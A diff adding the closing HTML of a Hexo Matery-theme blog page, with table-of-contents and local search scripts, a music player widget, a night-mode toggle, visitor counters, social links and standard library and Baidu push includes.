+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2025</span>
+            
+            <a href="/about" target="_blank">q1n9</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">121.2k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
